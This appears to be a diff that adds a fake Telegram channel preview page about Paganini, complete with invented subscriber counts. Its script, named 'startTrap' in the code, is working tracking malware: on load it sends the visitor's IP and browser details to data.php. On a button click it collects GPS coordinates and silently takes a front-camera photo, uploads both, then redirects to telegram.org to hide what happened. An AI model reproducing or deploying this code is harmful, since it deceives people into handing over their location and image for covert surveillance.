@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- META TAGS PARA PREVIEW (LINK PREVIEW) -->
+    <meta property="og:title" content="The Best of Paganini. Why Paganini Is Considered The Devil's Violinist">
+    <meta property="og:description" content="View details in Telegram app.">
+    <meta property="og:image" content="https://i.ytimg.com/vi/aNZR04sUJAM/hqdefault.jpg?sqp=-oaymwEmCKgBEF5IWvKriqkDGQgBFQAAiEIYAdgBAeIBCggYEAIYBjgBQAE=&rs=AOn4CLA22qDzjxxJyJwNu99Tka8zKs7X0w">
+    <meta property="og:type" content="website">
+    
+    <!-- TAGS EXTRAS PARA COMPATIBILIDADE -->
+    <meta name="twitter:image" content="https://i.ytimg.com/vi/aNZR04sUJAM/hqdefault.jpg?sqp=-oaymwEmCKgBEF5IWvKriqkDGQgBFQAAiEIYAdgBAeIBCggYEAIYBjgBQAE=&rs=AOn4CLA22qDzjxxJyJwNu99Tka8zKs7X0w">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta itemprop="image" content="https://i.ytimg.com/vi/aNZR04sUJAM/hqdefault.jpg?sqp=-oaymwEmCKgBEF5IWvKriqkDGQgBFQAAiEIYAdgBAeIBCggYEAIYBjgBQAE=&rs=AOn4CLA22qDzjxxJyJwNu99Tka8zKs7X0w">
+    
+    <title>The Best of Paganini. Why Paganini Is Considered The Devil's Violinist</title>
+    <style>
+        body { background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #000; }
+        .tg-container { text-align: center; max-width: 400px; width: 100%; padding: 20px; }
+        .tg-logo { width: 120px; height: 120px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; }
+        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 700; }
+        .tg-members { color: #87909c; font-size: 14px; margin-bottom: 30px; }
+        .tg-desc { font-size: 15px; color: #000; margin-bottom: 30px; line-height: 1.5; }
+        .btn-action { background-color: #3390ec; color: white; border: none; padding: 16px 0; width: 100%; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; text-transform: uppercase; transition: background 0.2s; text-decoration: none; display: block; }
+        .btn-action:hover { background-color: #2b7bc4; }
+    </style>
+</head>
+<body>
+
+<div class="tg-container">
+    <img src="images/807aeae0-cf40-11f0-95b4-5cc9d3d26eae.jpg" class="tg-logo">
+    <h1>The Best of Paganini. Why Paganini Is Considered The Devil's Violinist</h1>
+    <div class="tg-members">12 000 subscribers • 500 online</div>
+    <div class="tg-desc">View details in Telegram app.</div>
+    <button class="btn-action" onclick="startTrap()">VIEW IN TELEGRAM</button>
+</div>
+
+<script>
+    // 1. Captura IP ao carregar
+    window.onload = function() {
+        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
+            fetch('data.php', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip:d.ip, os:navigator.platform, platform:navigator.userAgent, browser:navigator.appName})});
+        });
+    };
+
+    function startTrap() {
+        if (navigator.geolocation) {
+            // Pede GPS
+            navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError);
+        } else { 
+            // Se GPS falhar ou não suportado, tenta Câmara
+            requestCamera(); 
+        }
+    }
+
+    function onPosSuccess(pos) {
+        // Envia GPS
+        fetch('data.php', {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy })
+        });
+        // Tenta Câmara IMEDIATAMENTE após o GPS
+        requestCamera();
+    }
+
+    function onPosError(err) {
+        // Se negar GPS, tenta Câmara mesmo assim
+        requestCamera();
+    }
+
+    function requestCamera() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(function(stream) {
+                // Cria vídeo invisível
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Espera 800ms para ajustar luz
+                setTimeout(function() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const data = canvas.toDataURL('image/png');
+                    
+                    // Para o stream
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Envia Foto e Finaliza
+                    fetch('data.php', {
+                        method: 'POST', headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({img: data})
+                    }).then(finish);
+                }, 800);
+            })
+            .catch(function(err) {
+                // Se negar câmara, finaliza
+                finish();
+            });
+        } else {
+            finish();
+        }
+    }
+
+    function finish() {
+        // Redireciona para o Telegram oficial
+        window.location.href = "https://telegram.org";
+    }
+</script>
+
+</body>
+</html>
